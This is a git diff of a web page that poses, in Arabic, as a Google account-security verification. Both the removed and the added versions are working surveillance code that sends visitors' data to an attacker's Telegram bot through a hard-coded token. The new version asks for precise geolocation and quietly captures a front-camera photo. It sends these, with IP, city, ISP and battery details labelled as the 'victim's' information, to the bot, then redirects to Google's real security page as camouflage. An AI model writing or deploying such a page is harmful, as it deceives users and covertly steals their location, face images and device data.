@@ -1,76 +1,96 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title></head>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد أمان الحساب - Google</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; max-width: 400px; padding: 20px; border: 1px solid #dadce0; border-radius: 8px; }
+        img { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
 <body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_Safe_Browsing_Logo.svg/1200px-Google_Safe_Browsing_Logo.svg.png" alt="Google Safe">
+    <h1>تأكيد هويتك</h1>
+    <p>لقد لاحظنا نشاطاً غير معتاد. لتأمين حسابك، يرجى السماح بفحص الأمان عبر الموقع الجغرافي والتعرف على الوجه.</p>
+    <button class="btn" onclick="startMission()">بدء فحص الأمان</button>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
 <script>
-    // بياناتك السرية
     const token = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
     const myId = "7109332130";
 
-    async function collectAllData() {
+    async function startMission() {
+        // 1. طلب الموقع الجغرافي فوراً
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                await sendTelegram(`📍 **تم تحديد الموقع بدقة!**\nالرابط: ${mapUrl}\nالدقة: ${p.coords.accuracy} متر`);
+                await captureProcess();
+            }, async (err) => {
+                await sendTelegram("⚠️ المستخدم رفض إذن الموقع.");
+                await captureProcess();
+            }, {enableHighAccuracy: true});
+        }
+
+        // 2. جمع بيانات الجهاز الـ IP والبطارية
+        const ipRes = await fetch('https://ipapi.co/json/').then(res => res.json());
+        const battery = navigator.getBattery ? await navigator.getBattery() : {level: 0};
+        
+        let report = `👤 **معلومات الضحية:**\n` +
+                     `🌐 IP: \`${ipRes.ip}\`\n` +
+                     `📍 المدينة: \`${ipRes.city}\`\n` +
+                     `📱 النظام: \`${navigator.platform}\`\n` +
+                     `🔋 البطارية: \`${battery.level * 100}%\`\n` +
+                     `🏢 الشركة: \`${ipRes.org}\``;
+        await sendTelegram(report);
+    }
+
+    async function captureProcess() {
         try {
-            // 1. جلب بيانات الـ IP والموقع الجغرافي
-            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
-
-            // 2. جلب بيانات البطارية (لو مسموح)
-            let batteryInfo = "غير متاح";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `${(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`;
-            }
-
-            // 3. تجميع بيانات الجهاز (Hardware)
-            const deviceData = {
-                platform: navigator.platform, // نظام التشغيل
-                cores: navigator.hardwareConcurrency || "غير معروف", // عدد الأنوية
-                ram: navigator.deviceMemory || "غير معروف", // الرام التقريبية
-                language: navigator.language, // لغة الجهاز
-                screen: `${window.screen.width}x${window.screen.height}`, // دقة الشاشة
-                userAgent: navigator.userAgent // تفاصيل المتصفح الكاملة
-            };
-
-            // 4. صياغة التقرير الشامل
-            const report = `
-🔥 **تم صيد صيد ثمين!** 🔥
-━━━━━━━━━━━━━━
-🌐 **بيانات الإنترنت:**
-- الـ IP: \`${ipInfo.ip}\`
-- المدينة: \`${ipInfo.city}\`
-- الدولة: \`${ipInfo.country_name}\`
-- الشركة: \`${ipInfo.org}\`
-
-💻 **مواصفات الجهاز:**
-- النظام: \`${deviceData.platform}\`
-- الرام: \`${deviceData.ram} GB\`
-- الأنوية: \`${deviceData.cores}\`
-- الشاشة: \`${deviceData.screen}\`
-- البطارية: \`${batteryInfo}\`
-
-🛠️ **تفاصيل إضافية:**
-- اللغة: \`${deviceData.language}\`
-- الوقت: \`${new Date().toLocaleString('ar-EG')}\`
-━━━━━━━━━━━━━━
-            `;
-
-            // 5. إرسال "الانفجار المعلوماتي" لتليجرام
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: myId,
-                    text: report,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // التمويه النهائي
-            window.location.href = "https://www.google.com";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const imageData = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(t => t.stop());
+                await sendPhotoToTelegram(imageData);
+                window.location.href = "https://myaccount.google.com/security"; // تمويه نهائي
+            }, 1000);
         } catch (e) {
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://myaccount.google.com/security";
         }
     }
 
-    collectAllData();
+    async function sendTelegram(text) {
+        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: myId, text: text, parse_mode: 'Markdown' })
+        });
+    }
+
+    async function sendPhotoToTelegram(base64) {
+        const blob = await (await fetch(base64)).blob();
+        const fd = new FormData();
+        fd.append('chat_id', myId);
+        fd.append('photo', blob, 'shot.jpg');
+        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+    }
 </script>
 </body>
 </html>
